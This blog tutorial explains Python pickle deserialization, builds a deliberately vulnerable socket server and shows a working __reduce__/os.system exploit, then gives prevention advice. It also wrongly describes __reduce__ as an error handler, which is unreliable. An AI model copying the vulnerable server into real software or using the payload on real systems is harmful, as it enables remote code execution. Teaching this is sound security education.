---
layout: post
title: Understanding Insecure Deserialization with Practical Examples
date: 2024-07-19 21:30:53.884914647 UTC
tags: Insecure Deserialization Web Security Exploitation Python
---

In this article, I will explain Insecure Deserialization. I will also demonstrate this by writing a simple vulnerable Python server and exploiting it.

Before we begin, we need to understand what objects are, what serialization and deserialization are, and some basic networking concepts.

All code in this article is available [here](https://github.com/pwnxpl0it/insecure_deserialization)

Let's start!

## What are objects ?

In object-oriented programming (OOP), objects are the basic entities that exist in memory. Each object is based on a blueprint of attributes and behaviors (variables and functions) defined as a Class.

Example of a class object in Python

```python
class Person:
    def __init__(self, name, age) -> None:
        self.name = name
        self.age = age

    def summary(self):
        print(f"My name is {self.name}, I am {self.age} years old!")

robert = Person("Robert", 18)

```

Now let's imagine we want to send this object over the network, so we can use it later, That's when we need to Serialize the objects.

## What is Serialization?
Serialization (or serialisation) is the process of translating a data structure or object state into a format that can be stored or transmitted (e.g., data streams over computer networks) and reconstructed later (possibly in a different computer environment).

![credit: https://learn.microsoft.com/en-us/dotnet/visual-basic/programming-guide/concepts/serialization/](https://learn.microsoft.com/en-us/dotnet/visual-basic/programming-guide/concepts/serialization/media/index/serialization-process.gif)

When the resulting series of bits is reread according to the serialization format, it can be used to create a semantically identical clone of the original object. For many complex objects, such as those that make extensive use of references.

Let's see an example of serializing the `Person` object using Python's [pickle](https://docs.python.org/3/library/pickle.html) library:

```python
import pickle

class Person:
    def __init__(self, name, age) -> None:
        self.name = name
        self.age = age

    def summary(self):
        print(f"My name is {self.name}, I am {self.age} years old!")


robert = Person("Robert", 18)

print(pickle.dumps(robert))

```

Let's run the script
```console
$ python3 example-2.py
b'\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94}\x94(\x
8c\x04name\x94\x8c\x06Robert\x94\x8c\x03age\x94K\x12ub.'
```

As we can see it's now all bytes! we can store it into a file or send it over the network,we can do whatever we want,
however we need to make sure we can use (Deserialize) it later.


## What is Deserialization

Deserialization is the process of reconstructing a data structure or object from a series of bytes or a string to instantiate the object for consumption.

This is the reverse process of serialization, i.e., converting a data structure or object into a series of bytes for storage or transmission across devices.

For our `Person` class, we will make a simple python server to receive the bytes ( Serialized Data )
Then it's going to call the `summary()` method.

```python
import socket, pickle

class Person:
    def __init__(self, name, age) -> None:
        self.name = name
        self.age = age

    def summary(self):
        print(f"My name is {self.name}, I am {self.age} years old!")

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

s.bind(("0.0.0.0",4444))

s.listen()

c, addr = s.accept()

print(f"New connection from {addr[0]}\n")

person = pickle.loads(c.recv(1024))

person.summary()

```

And let's create a client that connects to the server and sends an instance of `Person` class to the server

```python
import pickle
import socket

class Person:
    def __init__(self, name, age) -> None:
        self.name = name
        self.age = age

    def summary(self):
        print(f"My name is {self.name}, I am {self.age} years old!")


elliot = Person("Elliot Alderson", 28 )

host = "127.0.0.1"
port = 4444

s = socket.socket()

s.connect((host,port))

payload = pickle.dumps(elliot)

s.send(payload)

```

Let's start the server first and then run the client to see what happens.

![expected](/assets/img/deserialization/expected.png)

It works! But when does it become a security issue? Let's move on to Insecure Deserialization.

## Insecure Deserialization

Insecure Deserialization is a vulnerability that occurs when untrusted data is used to abuse the logic of an application, inflict a denial of service (DoS) attack, or even execute arbitrary code upon being deserialized.

Basically, when the user controls the data, it becomes a problem, because the user can manipulate the data being sent to our application.

The exploitation mechanism differs for each language, since we are using Python it's relatively easy.

Let's continue with our example, let's exploit the server,

The exploit utilizes the `__reduce__` method, which tells the pickle module how to handle deserialization errors natively within a class directly.

To understand what is `__reduce__` see this [Stackoverflow](https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler) question.

we will also use [os.system()](https://docs.python.org/3/library/os.html#os.system), to execute `id` command

```python
import pickle
import socket

class Exploit:
    def __reduce__(self):
        import os
        # return type of __reduce__ must be a str or tuple
        # so we are going to return a tuple of ( function , (arguments_to_that_function, ) )
        return ( os.system , ("id",) )

exploit =  Exploit()

host = "127.0.0.1"
port = 4444

s = socket.socket()

s.connect((host,port))

payload = pickle.dumps(exploit)

print(payload)

s.send(payload)

```

Now when our server tries to deserialize the `Exploit` class as `Person` it is going to fail,and because we added the `__reduce__` method, It's going to run whatever code inside the `__reduce__` method to handle the error, keep in mind that we can make it fail in a number of ways.

Let's start the server and launch our exploit.

![exploit](/assets/img/deserialization/exploit-1.png)

And that's it!

## Preventing Insecure Deserialization vulnerabilities

Generally speaking, deserialization of user input should be avoided unless absolutely necessary. The high severity of exploits that it potentially enables, and the difficulty in protecting against them, often outweigh the benefits.

If you do need to deserialize data from untrusted sources, incorporate robust measures to ensure the data has not been tampered with. For example, you could implement a digital signature to check the integrity of the data. However, any checks must occur before deserialization begins. Otherwise, they are of little use.

If possible, avoid using generic deserialization features altogether. Serialized data from these methods contains all attributes of the original object, including private fields that may contain sensitive information. Instead, create your own class-specific serialization methods to control which fields are exposed.

Remember, the vulnerability lies in the deserialization of user input, not the presence of gadget chains that handle the data subsequently. Do not rely solely on eliminating gadget chains identified during testing. It is impractical to plug all potential vulnerabilities due to cross-library dependencies. Additionally, publicly documented memory corruption exploits may also be a factor, making your application vulnerable regardless.

## References
 - This awesome [Video](https://www.youtube.com/watch?v=jwzeJU_62IQ) by [@pwnfunction](https://x.com/PwnFunction)
 - https://www.geeksforgeeks.org/what-are-objects-in-programming/
 - https://en.wikipedia.org/wiki/Serialization
 - https://hazelcast.com/glossary/deserialization/
 - https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/
 - https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler
 - https://portswigger.net/web-security/deserialization
